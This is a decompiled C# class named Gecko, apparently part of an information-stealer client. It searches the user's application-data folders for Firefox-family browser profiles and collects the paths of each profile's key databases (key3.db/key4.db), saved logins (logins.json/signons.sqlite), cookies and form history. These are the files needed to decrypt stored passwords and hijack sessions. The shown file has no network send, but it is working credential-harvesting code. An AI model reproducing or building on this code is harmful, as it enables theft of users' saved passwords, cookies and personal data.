using System;
using System.Collections.Generic;
using System.IO;
using client.Helpers;
using client.Models;

namespace client.Body
{
	// Token: 0x02000043 RID: 67
	internal class Gecko
	{
		// Token: 0x06000192 RID: 402 RVA: 0x00008F10 File Offset: 0x00007110
		public static List<GeckoBrowserStructure> Get()
		{
			List<GeckoBrowserStructure> list = new List<GeckoBrowserStructure>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			list.AddRange(Gecko.Parse(folderPath));
			list.AddRange(Gecko.Parse(folderPath2));
			return list;
		}

		// Token: 0x06000193 RID: 403 RVA: 0x00008F4C File Offset: 0x0000714C
		private static List<GeckoBrowserStructure> Parse(string dir)
		{
			List<GeckoBrowserStructure> list = new List<GeckoBrowserStructure>();
			foreach (string text in ParserHelper.ParseFolders(dir, 3, "profiles.ini"))
			{
				List<GeckoDefaultProfile> geckoProfiles = new List<GeckoDefaultProfile>();
				string text2 = text;
				if (Directory.Exists(Path.Combine(text, "Profiles")))
				{
					text2 = Path.Combine(text, "Profiles");
				}
				DirectoryInfo[] directories = new DirectoryInfo(text2).GetDirectories();
				for (int i = 0; i < directories.Length; i++)
				{
					Gecko.GenerateFromPath(directories[i].FullName, ref geckoProfiles);
				}
				string name = Gecko.GetName(text2, dir);
				list.Add(new GeckoBrowserStructure
				{
					GeckoBrowserName = name,
					GeckoProfiles = geckoProfiles
				});
			}
			return list;
		}

		// Token: 0x06000194 RID: 404 RVA: 0x0000902C File Offset: 0x0000722C
		private static void GenerateFromPath(string path, ref List<GeckoDefaultProfile> profile)
		{
			string name = new DirectoryInfo(path).Name;
			profile.Add(new GeckoDefaultProfile
			{
				KeyDB = (Gecko.ValidateFile(path, "key3.db") ?? Gecko.ValidateFile(path, "key4.db")),
				GeckoProfileName = name,
				GeckoLoginData = (Gecko.ValidateFile(path, "logins.json") ?? Gecko.ValidateFile(path, "signons.sqlite")),
				GeckoCookies = Gecko.ValidateFile(path, "cookies.sqlite"),
				GeckoWebData = Gecko.ValidateFile(path, "formhistory.sqlite")
			});
		}

		// Token: 0x06000195 RID: 405 RVA: 0x000090BC File Offset: 0x000072BC
		private static string GetName(string dir, string source)
		{
			string[] array = dir.Replace(source + "\\", null).Split(new char[]
			{
				'\\'
			});
			string result;
			try
			{
				result = ((array[2] == "Profiles") ? array[1] : array[0]);
			}
			catch
			{
				result = array[0];
			}
			return result;
		}

		// Token: 0x06000196 RID: 406 RVA: 0x000086B7 File Offset: 0x000068B7
		private static string ValidateFile(string path, string file)
		{
			if (File.Exists(Path.Combine(path, file)))
			{
				return Path.Combine(path, file);
			}
			return null;
		}
	}
}
